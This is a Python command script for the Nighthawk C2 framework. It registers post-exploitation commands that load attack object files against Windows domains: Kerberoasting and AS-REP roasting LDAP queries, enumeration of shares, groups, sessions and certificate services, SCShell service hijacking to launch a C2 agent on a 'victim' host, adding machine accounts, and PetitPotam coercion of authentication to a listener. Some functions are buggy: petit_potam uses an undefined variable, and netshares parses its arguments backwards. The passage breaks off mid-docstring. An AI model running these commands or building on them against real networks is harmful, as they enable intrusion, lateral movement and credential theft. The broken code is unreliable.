import json
import base64

def replace_quotes(s):
        return s.strip().strip('"').strip("'")

def write_output(notification, file_name: str, output_to_console: bool):
    notification = json.loads(notification)
    if file_name != "":
        f = open(file_name, "w", encoding="utf-8")
    for output in notification['CommandResponse']['ExecutionResult']['Outputs']:
        line = f"{base64.b64decode(output['buffer']).decode('utf-8', errors='replace')}"
        if output_to_console:
            nighthawk.console_write(CONSOLE_INFO, line )
        if file_name != "":
            f.write(line)
    
    if file_name != "":
        f.close()

# region BOF - ldapsearch
def ldapsearch_param(params, info):
    # Default values
    query = "(objectclass=domain)"
    attributes = "*"
    result_limit = 0
    scope = 3
    hostname = ""
    dn = ""
    ldaps = False
    skip = False
    save_to_file = ""
    output_to_console = True

    # Parse args
    if len(params) > 0:
        query = replace_quotes(params[0])
        i = 1
        while i < len(params):
            arg = params[i]
            option = arg.split(" ", 1)[0].lower()
            if len(params) > i+1:
                value = params[i+1]
            else:
                value = ""
            if option == "--attributes":
                attributes = value
                i += 1
            elif option == "--count":
                result_limit = int(value)
                i += 1
            elif option == "--scope":
                scope = int(value)
                i += 1
            elif option == "--hostname":
                hostname = value
                i += 1
            elif option == "--dn":
                dn = value
                i += 1
            elif option == "--ldaps":
                ldaps = True
            elif option == "--save-to-file":
                save_to_file = value
                i += 1
            elif option == "--suppress-console-output":
                output_to_console = False
            else:
                nighthawk.console_write(CONSOLE_ERROR, f"Unknown argument: {arg}")
                nighthawk.console_write(CONSOLE_ERROR, "Usage: ldapsearch <query> [--attributes] [--count] [--scope] [--hostname] [--dn] [--ldaps] [--save-to-file]")
                return None
            i += 1

    # Pack parameters
    packer = Packer()
    packer.addstr(query)
    packer.addstr(attributes)
    packer.addint32(result_limit)
    packer.addint32(scope)
    packer.addstr(hostname)
    packer.addstr(dn)
    packer.addbool(ldaps)

    packed_params = packer.getbuffer()

    # You can now call your static function
    # static_call(packed_params, info)
    return packed_params, save_to_file, output_to_console

def ldapsearch(params, info):
    with open(nighthawk.script_resource(f"bin/SA/ldapsearch/ldapsearch.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params, save_to_file, output_to_console = ldapsearch_param(params, info)
    if type(packed_params) != bytes:
        return False
    nighthawk.console_write(CONSOLE_INFO, "executing ldapserach BOF")
    notification = api.execute_bof(f"ldapsearch.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", sync=True)
    write_output(notification, save_to_file, output_to_console)
    nighthawk.console_write(CONSOLE_INFO, "Finished executing ldapsearch BOF")

nighthawk.register_command(ldapsearch, "ldapsearch", "BOF - Perform LDAP search (avantguard script)" , "BOF - Perform LDAP search (avantguard script)", """ldapsearch <query> [--attributes] [--count] [--scope] [--hostname] [--dn] [--ldaps] [--save-to-file]
	with :
		query => the LDAP query to be performed
		--attributes [comma_separated_attributes] => the attributes to retrieve (default: *)
		--count [count] => the result max size (default: None)
		--scope [scope] => the scope to use [1 = BASE, 2 = LEVEL, 3 = SUBTREE] (default: 3)
		--hostname [hostname] => hostname or IP to perform the LDAP connection on (default: automatic DC resolution)
		--dn [dn] => the LDAP query base
		--ldaps => use of ldaps
                --save-to-file => file to write output to
                --suppress-console-output => suppress output to Nighthawk console
Important - To add in ACLs so Bloodhound can draw relationships between objects (see external BofHound tool), add nTSecurityDescriptor in the attributes list, like so:
ldapsearch <query> --attributes *,ntsecuritydescriptor ...
Useful queries (queries are just an example, edit where necessary to make it OPSEC safe):
- Kerberoastable:\n(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
- AS-REP Roastable:\n(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
- Passwords stored with reversible encryption:\n(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))
If this fails with an error about paging not being supported you can try to use nonpagedldapsearch instead (its unregistered but has the same arguments)

THIS IS AN AVANTGUARD SCRIPT""", "ldapsearch (objectclass=domain)")
# endregion

# region BOF - netshares & netsharesAdmin

def netshares(params, info):
    with open(nighthawk.script_resource(f"bin/SA/netshares/netshares.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    host = ""
    admin = False
    for i in range(0, len(params)):
        if (params[i] == "--admin"):
            host = params[0]
        else:
            admin = True
    packer = Packer()
    packer.addwstr(host)
    packer.addbool(admin)
    packed_params = packer.getbuffer()
    if type(packed_params) != bytes:
        return False
    nighthawk.console_write(CONSOLE_INFO, "executing netshares BOF")
    api.execute_bof(f"netshares.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True)


nighthawk.register_command(netshares, "netshares", "BOF - list shares on local or remote computer (avantguard script)" , "BOF - list shares on local or remote computer (avantguard script)", """netshares <\\\\computername> <--admin>
with --admin it finds more info then standard netshares but requires admin

THIS IS AN AVANTGUARD SCRIPT""", "netshares \\\\ws21")

# endregion

# region BOF - adcs_enum

def adcs_enum(params, info):
    with open(nighthawk.script_resource(f"bin/SA/adcs_enum/adcs_enum.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    domain = ""
    if len(params) > 0:
        domain = params[0]
    packer = Packer()
    packer.addwstr(domain)
    packed_params = packer.getbuffer()
    if type(packed_params) != bytes:
        return False
    nighthawk.console_write(CONSOLE_INFO, "executing adcs_enum BOF")
    api.execute_bof(f"adcs_enum.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True)


nighthawk.register_command(adcs_enum, "adcs_enum", "BOF - Enumerates CAs and templates in the AD using Win32 functions (avantguard script)" , "BOF - Enumerates CAs and templates in the AD using Win32 functions (avantguard script)", """adcs_enum <domain>
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Acitive Directory Certificate Services using
         undocumented Win32 functions. It displays basic information as well 
         as the CA cert, flags, permissions, and similar information for the 
         templates.
Usage:   adcs_enum (domain)
		 domain		Optional. Specified domain otherwise uses current domain.

THIS IS AN AVANTGUARD SCRIPT""", "adcs_enum CONTOSO.com")

# endregion

# region BOF - adcs_enum_com

def adcs_enum_com(params, info):
    with open(nighthawk.script_resource(f"bin/SA/adcs_enum_com/adcs_enum_com.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    packer = Packer()
    packed_params = packer.getbuffer()  # no parameters for this one

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing adcs_enum_com BOF")
    api.execute_bof(f"adcs_enum_com.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True)


nighthawk.register_command(
    adcs_enum_com,
    "adcs_enum_com",
    "BOF - Enumerates CAs and templates in the AD using ICertConfig COM object (avantguard script)",
    "BOF - Enumerates CAs and templates in the AD using ICertConfig COM object (avantguard script)",
    """adcs_enum_com
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Active Directory Certificate Services using 
         the ICertConfig, ICertRequest, and IX509CertificateTemplate COM 
         objects. It displays basic information as well as the CA cert, flags, 
         permissions, and similar information for the templates.
Usage:   adcs_enum_com

THIS IS AN AVANTGUARD SCRIPT""",
    "adcs_enum_com"
)

# endregion

# region BOF - adcs_enum_com2

def adcs_enum_com2(params, info):
    with open(nighthawk.script_resource(f"bin/SA/adcs_enum_com2/adcs_enum_com2.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    packer = Packer()
    packed_params = packer.getbuffer()  # no parameters for this one either

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing adcs_enum_com2 BOF")
    api.execute_bof(f"adcs_enum_com2.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True)


nighthawk.register_command(
    adcs_enum_com2,
    "adcs_enum_com2",
    "BOF - Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object (avantguard script)",
    "BOF - Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object (avantguard script)",
    """adcs_enum_com2
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Active Directory Certificate Services using 
         the IX509PolicyServerListManager, IX509PolicyServerUrl, 
         IX509EnrollmentPolicyServer, ICertificationAuthority, and 
         IX509CertificateTemplate COM objects. It displays basic information as
         well as the CA cert, flags, permissions, and similar information for
         the templates.
Usage:   adcs_enum_com2

THIS IS AN AVANTGUARD SCRIPT""",
    "adcs_enum_com2"
)

# endregion

# region BOF - routeprint

def routeprint(params, info):
    with open(nighthawk.script_resource(f"bin/SA/routeprint/routeprint.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packer = Packer()
    packed_params = packer.getbuffer()
    if type(packed_params) != bytes:
        return False
    nighthawk.console_write(CONSOLE_INFO, "executing routeprint BOF")
    api.execute_bof(f"routeprint.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True)


nighthawk.register_command(routeprint, "routeprint", "BOF - prints ipv4 routes on the machine (avantguard script)", "BOF - prints ipv4 routes on the machine (avantguard script)", """prints ipv4 routes on the machine

THIS IS AN AVANTGUARD SCRIPT""", "routeprint ")

# endregion

# region BOF - ipconfig

def ipconfig(params, info):
    with open(nighthawk.script_resource(f"bin/SA/ipconfig/ipconfig.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    packer = Packer()
    packed_params = packer.getbuffer()  # no parameters for ipconfig

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing ipconfig BOF")
    api.execute_bof(
        f"ipconfig.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "T1016",  # matches the MITRE technique from original
        show_in_console=True
    )


nighthawk.register_command(
    ipconfig,
    "ipconfig",
    "BOF - Runs an internal ipconfig command (avantguard script)",
    "BOF - Runs an internal ipconfig command (avantguard script)",
    """ipconfig
Summary: Lists out adapters, system hostname, and configured DNS servers.
Usage:   ipconfig

THIS IS AN AVANTGUARD SCRIPT""",
    "ipconfig"
)

# endregion

# region BOF - netGroupList / netGroupListMembers

def netGroupList(params, info):
    """
    Lists groups in this domain (or a specified domain if provided)
    """
    with open(nighthawk.script_resource(f"bin/SA/netgroup/netgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    domain = ""
    if len(params) > 0:
        domain = params[0]

    packer = Packer()
    packer.addshort(0)         # type = 0 (list groups)
    packer.addwstr(domain)     # domain
    packer.addwstr("")         # group (empty)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing netGroupList BOF")
    api.execute_bof(
        f"netgroup.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    netGroupList,
    "netGroupList",
    "BOF - List Groups in this domain (or specified domain if given) (avantguard script)",
    "BOF - List Groups in this domain (or specified domain if given) (avantguard script)",
    """netGroupList <opt: domainname>
Summary: Lists all groups in this domain or the specified domain.
Usage:   netGroupList [domainname]

THIS IS AN AVANTGUARD SCRIPT""",
    "netGroupList CONTOSO.com"
)


def netGroupListMembers(params, info):
    """
    Lists members of the specified domain group
    """
    with open(nighthawk.script_resource(f"bin/SA/netgroup/netgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    group = ""
    domain = ""
    if len(params) > 0:
        group = params[0]
    if len(params) > 1:
        domain = params[1]

    packer = Packer()
    packer.addshort(1)         # type = 1 (list members)
    packer.addwstr(domain)
    packer.addwstr(group)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing netGroupListMembers BOF")
    api.execute_bof(
        f"netgroup.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    netGroupListMembers,
    "netGroupListMembers",
    "BOF - List the members of the specified group in this domain (avantguard script)",
    "BOF - List the members of the specified group in this domain (avantguard script)",
    """netGroupListMembers <Group Name> <opt: domainname>
Summary: Lists the members of the specified group in this domain or another domain.
Usage:   netGroupListMembers "Domain Admins" CONTOSO.com

THIS IS AN AVANTGUARD SCRIPT""",
    "netGroupListMembers \"Domain Admins\" CONTOSO.com"
)

# endregion

# region BOF - netLocalGroupList / netLocalGroupListMembers

def netLocalGroupList(params, info):
    """
    Lists groups in the local server (or specified server if given)
    """
    with open(nighthawk.script_resource(f"bin/SA/netlocalgroup/netlocalgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    server = ""
    if len(params) > 0:
        server = params[0]

    packer = Packer()
    packer.addshort(0)         # type = 0 (list groups)
    packer.addwstr(server)
    packer.addwstr("")         # group (empty)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing netLocalGroupList BOF")
    api.execute_bof(
        f"netlocalgroup.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    netLocalGroupList,
    "netLocalGroupList",
    "BOF - List Groups in this server (or specified server if given) (avantguard script)",
    "BOF - List Groups in this server (or specified server if given) (avantguard script)",
    """netLocalGroupList <opt: servername>
Summary: Lists all local groups in this server or the specified server.
Usage:   netLocalGroupList SERVER01

THIS IS AN AVANTGUARD SCRIPT""",
    "netLocalGroupList SERVER01"
)


def netLocalGroupListMembers(params, info):
    """
    Lists members of the specified local group
    """
    with open(nighthawk.script_resource(f"bin/SA/netlocalgroup/netlocalgroup.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    group = ""
    server = ""
    if len(params) > 0:
        group = params[0]
    if len(params) > 1:
        server = params[1]

    packer = Packer()
    packer.addshort(1)         # type = 1 (list members)
    packer.addwstr(server)
    packer.addwstr(group)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing netLocalGroupListMembers BOF")
    api.execute_bof(
        f"netlocalgroup.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    netLocalGroupListMembers,
    "netLocalGroupListMembers",
    "BOF - List the members of the specified group in this server (avantguard script)",
    "BOF - List the members of the specified group in this server (avantguard script)",
    """netLocalGroupListMembers <Group Name> <opt: servername>
Summary: Lists the members of the specified group in this server or another server.
Usage:   netLocalGroupListMembers "Administrators" SERVER01

THIS IS AN AVANTGUARD SCRIPT""",
    "netLocalGroupListMembers \"Administrators\" SERVER01"
)

# endregion

# region BOF - netLocalGroupListMembers2

def netLocalGroupListMembers2(params, info):
    """
    Lists members of the specified local group (bofhound-compatible output)
    """
    with open(nighthawk.script_resource(f"bin/SA/netlocalgroup2/netlocalgroup2.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    group = ""
    server = ""
    if len(params) > 0:
        group = params[0]
    if len(params) > 1:
        server = params[1]

    packer = Packer()
    packer.addwstr(server)
    packer.addwstr(group)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing netLocalGroupListMembers2 BOF")
    api.execute_bof(
        f"netlocalgroup2.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    netLocalGroupListMembers2,
    "netLocalGroupListMembers2",
    "BOF - List the members of the specified group in this server (bofhound compatible, avantguard script)",
    "BOF - List the members of the specified group in this server (bofhound compatible, avantguard script)",
    """netLocalGroupListMembers2 <opt: Group Name> <opt: servername>
Summary: Lists the members of the specified group in this server (or specified server if given).
         Output is compatible with bofhound.
Usage:   netLocalGroupListMembers2 "Administrators" SERVER01

THIS IS AN AVANTGUARD SCRIPT""",
    "netLocalGroupListMembers2 \"Administrators\" SERVER01"
)

# endregion

# region BOF - reg_query / reg_query_recursive

def reg_query(params, info):
    """
    Queries a registry key or value (optionally remote).
    """
    with open(nighthawk.script_resource(f"bin/SA/reg_query/reg_query.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: reg_query [hostname] <hive> <path> [value]")
        return False

    # Registry hive mapping like in %reghives
    reghives = {
        "HKLM": 2,
        "HKCU": 1,
        "HKU":  3,
        "HKCR": 0
    }

    hostname = ""
    hive = ""
    path = ""
    key = ""
    recursive_flag = 0

    # Determine if first argument is hostname or hive
    if params[0].upper() in reghives:
        # Local machine
        hostname = ""
        hive = reghives[params[0].upper()]
        if len(params) >= 2:
            path = params[1]
        if len(params) >= 3:
            key = params[2]
    else:
        # Remote host
        hostname = f"\\\\{params[0]}"
        if len(params) < 2 or params[1].upper() not in reghives:
            nighthawk.console_write(CONSOLE_ERROR, "Invalid or missing hive name.")
            return False
        hive = reghives[params[1].upper()]
        if len(params) >= 3:
            path = params[2]
        if len(params) >= 4:
            key = params[3]

    packer = Packer()
    packer.addstr(hostname)
    packer.addint32(hive)
    packer.addstr(path)
    packer.addstr(key)
    packer.addint32(recursive_flag)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing reg_query BOF")
    api.execute_bof(
        f"reg_query.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    reg_query,
    "reg_query",
    "BOF - Queries a registry key or value (avantguard script)",
    "BOF - Queries a registry key or value (avantguard script)",
    """reg_query <opt:hostname> <hive> <path> <opt:value>
Summary: Queries a registry key or value on the local or a remote system.
Usage:   reg_query [hostname] <hive> <path> [value]

Valid hives:
  HKLM
  HKCU
  HKU
  HKCR

If a value name is not specified, the key itself is enumerated.

THIS IS AN AVANTGUARD SCRIPT""",
    "reg_query HKLM Software\\Microsoft\\Windows\\CurrentVersion"
)


def reg_query_recursive(params, info):
    """
    Recursively queries registry keys (optionally remote).
    """
    with open(nighthawk.script_resource(f"bin/SA/reg_query/reg_query.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: reg_query_recursive [hostname] <hive> <path>")
        return False

    reghives = {
        "HKLM": 2,
        "HKCU": 1,
        "HKU":  3,
        "HKCR": 0
    }

    hostname = ""
    hive = ""
    path = ""
    recursive_flag = 1  # indicates recursion mode

    if params[0].upper() in reghives:
        # Local
        hive = reghives[params[0].upper()]
        if len(params) >= 2:
            path = params[1]
    else:
        # Remote
        hostname = f"\\\\{params[0]}"
        if len(params) < 2 or params[1].upper() not in reghives:
            nighthawk.console_write(CONSOLE_ERROR, "Invalid or missing hive name.")
            return False
        hive = reghives[params[1].upper()]
        if len(params) >= 3:
            path = params[2]

    packer = Packer()
    packer.addstr(hostname)
    packer.addint32(hive)
    packer.addstr(path)
    packer.addstr("")
    packer.addint32(recursive_flag)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing reg_query_recursive BOF")
    api.execute_bof(
        f"reg_query.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )


nighthawk.register_command(
    reg_query_recursive,
    "reg_query_recursive",
    "BOF - Recursively queries a registry key (avantguard script)",
    "BOF - Recursively queries a registry key (avantguard script)",
    """reg_query_recursive <opt:hostname> <hive> <path>
Summary: Recursively queries registry keys on the local or a remote system.
Usage:   reg_query_recursive [hostname] <hive> <path>

Valid hives:
  HKLM
  HKCU
  HKU
  HKCR

If a value to query is not specified, the specified key is recursively enumerated.

THIS IS AN AVANTGUARD SCRIPT""",
    "reg_query_recursive HKLM Software\\Microsoft"
)

# endregion

# region BOF - enumLocalSessions

def enumlocalsessions(params, info):
    with open(nighthawk.script_resource(f"bin/SA/enumlocalsessions/enumlocalsessions.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    packer = Packer()
    packed_params = packer.getbuffer()  # no parameters for ipconfig

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing enumlocalsessions BOF")
    api.execute_bof(
        f"enumlocalsessions.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "T1033",  # matches the MITRE technique from original
        show_in_console=True
    )


nighthawk.register_command(
    enumlocalsessions,
    "enumlocalsessions",
    "BOF - Enumerate the currently attached user sessions both local and over rdp (avantguard script)",
    "BOF - Enumerate the currently attached user sessions both local and over rdp (avantguard script)",
    """enumlocalsessions
Summary: Enumerate the currently attached user sessions both local and over rdp.
Usage:   enumlocalsessions

THIS IS AN AVANTGUARD SCRIPT""",
    "enumlocalsessions"
)

# endregion

# region BOF - probe

def probe(params, info):
    with open(nighthawk.script_resource(f"bin/SA/probe/probe.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    port = 0
    server = ""
    if len(params) > 1:
        server = params[0]
        port = int(params[1])
    else:
        nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   probe <host> <port>")
        return False

    if port < 1 or port > 65535:
        nighthawk.console_write(CONSOLE_ERROR, f"!! Port out of range of 1-65534")
        return False

    packer = Packer()
    packer.addstr(server)
    packer.addint32(port)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing probe BOF")
    api.execute_bof(
        f"probe.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "T1046",
        show_in_console=True
    )


nighthawk.register_command(
    probe,
    "probe",
    "BOF - Test TCP Port (avantguard script)",
    "BOF - Test TCP Port (avantguard script)",
    """probe [Server or IP] [Port]
Summary: Test TCP Port.
Usage:   probe <host> <port>

THIS IS AN AVANTGUARD SCRIPT""",
    "probe 10.0.0.2 445"
)

# endregion



# region BOF - scshell64

def scshell64(params, info):
    with open(nighthawk.script_resource(f"bin/SCShell-master/CS-BOF/scshellbof.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    # $target, $service, "C:\\ $+ $exepath"
    target = ""
    service = ""
    exepath = ""
    if len(params) > 2:
        target = params[0]
        service = params[1]
        exepath = params[2]
    else:
        nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   scshell64 <target> <service> <exepath>")
        return False

    packer = Packer()
    packer.addstr(target)
    packer.addstr(service)
    packer.addstr(exepath)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing probe BOF")
    api.execute_bof(
        f"scshellbof.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "T1569",
        show_in_console=True
    )


nighthawk.register_command(
    scshell64,
    "scshell64",
    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
    """scshell64 <target> <service> <exepath>
Summary: Use ChangeServiceConfigA to run Beacon payload.
Usage:   scshell64 <target> <service> <exepath>

Excample: scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe
Hint: Copy a c2-agent to the remote system \\myvictim\C$\Windows\System32\avcsvc.exe before using this command!

THIS IS AN AVANTGUARD SCRIPT""",
    "scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe"
)

# endregion



# region BOF - machine account add/del/get

def add_machine_account(params, info):
    """
    Add a computer account to the Active Directory domain.
    """

    if len(params) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: add_machine_account <computername> <password>")
        return False

    computerName = params[0]
    password = params[1]
    packer = Packer()
    packer.addstr(computerName)
    packer.addstr(password)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    with open(nighthawk.script_resource(f"bin/MachineAccount/AddMachineAccount/AddMachineAccount.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    nighthawk.console_write(CONSOLE_INFO, "executing AddMachineAccount BOF")
    api.execute_bof(
        f"AddMachineAccount.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    add_machine_account,
    "add_machine_account",
    "BOF - Add a computer account to the Active Directory domain. (avantguard script)",
    "BOF - Add a computer account to the Active Directory domain. (avantguard script)",
    """add_machine_account <computername> <password>
    Summary: Use Active Directory Service Interfaces (ADSI) to add a computer account to AD.
    Usage: add_machine_account <computername> <password>
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "add_machine_account MYCOMPUTER$ Passw0rd!"
)

def del_machine_account(params, info):
    """
    Remove a computer account from the Active Directory domain.
    """
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: del_machine_account <computername>")
        return False

    computerName = params[0]
    packer = Packer()
    packer.addstr(computerName)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    with open(nighthawk.script_resource(f"bin/MachineAccount/DelMachineAccount/DelMachineAccount.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    nighthawk.console_write(CONSOLE_INFO, "executing DelMachineAccount BOF")
    api.execute_bof(
        f"DelMachineAccount.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    del_machine_account,
    "del_machine_account",
    "BOF - Remove a computer account from the Active Directory domain. (avantguard script)",
    "BOF - Remove a computer account from the Active Directory domain. (avantguard script)",
    """del_machine_account <computername>
    Summary: Use Active Directory Service Interfaces (ADSI) to delete a computer account from AD.
    Usage: del_machine_account <computername>
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "del_machine_account MYCOMPUTER$"
)

def get_machine_account_quota(params, info):
    """
    Read the MachineAccountQuota value from the Active Directory domain.
    """
    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    with open(nighthawk.script_resource(f"bin/MachineAccount/GetMachineAccountQuota/GetMachineAccountQuota.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    nighthawk.console_write(CONSOLE_INFO, "executing GetMachineAccountQuota BOF")
    api.execute_bof(
        f"GetMachineAccountQuota.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    get_machine_account_quota,
    "get_machine_account_quota",
    "BOF - Read the MachineAccountQuota value from the Active Directory domain. (avantguard script)",
    "BOF - Read the MachineAccountQuota value from the Active Directory domain. (avantguard script)",
    """get_machine_account_quota
    Summary: Use Active Directory Service Interfaces (ADSI) to read the ms-DS-MachineAccountQuota value from AD.
    Usage: get_add_machine_account_quota
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "get_machine_account_quota"
)

# endregion

# region PetitPotam

def petit_potam(params, info):
    """
    Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability.
    """

    if len(args) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: petit_potam <targetMachine> <listenerMachine>")
        return False

    target_machine = args[0]
    listener_machine = args[1]
    packer = Packer()
    packer.addstr(target_machine)
    packer.addstr(listener_machine)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    with open(nighthawk.script_resource(f"bin/Exploit/PetitPotam/PetitPotam.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    nighthawk.console_write(CONSOLE_INFO, "executing PetitPotam BOF")
    api.execute_bof(
        f"PetitPotam.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    petit_potam,
    "petit_potam",
    "BOF - Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability. (avantguard script)",
    "BOF - Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability. (avantguard script)",
    """petit_potam
    Summary: Coerce authentication from the target machine to listener machine via MS-EFSRPC EfsRpcOpenFileRaw.
    Usage: petit_potam <targetMachine> <listenerMachine>
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "petit_potam"
)

# endregion

# region PrivCheck

def always_install_elevated_check(params, info):
    """
    Check for AlwaysInstallElevated privilege escalation vulnerability.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False
        
    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/AlwaysInstallElevated/AlwaysInstallElevated.{info.Agent.ProcessArch}.o")

    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return
    nighthawk.console_write(CONSOLE_INFO, "executing AlwaysInstallElevated BOF")
    api.execute_bof(
        f"AlwaysInstallElevated.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    always_install_elevated_check,
    "always_install_elevated_check",
    "BOF - Check for AlwaysInstallElevated privilege escalation vulnerability. (avantguard script)",
    "BOF - Check for AlwaysInstallElevated privilege escalation vulnerability. (avantguard script)",
    """always_install_elevated_check
    Summary: Checks if AlwaysInstallElevated is enabled in both HKCU and HKLM. This misconfiguration allows any user to install MSI packages with SYSTEM privileges.

    Vulnerability Conditions:
    HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
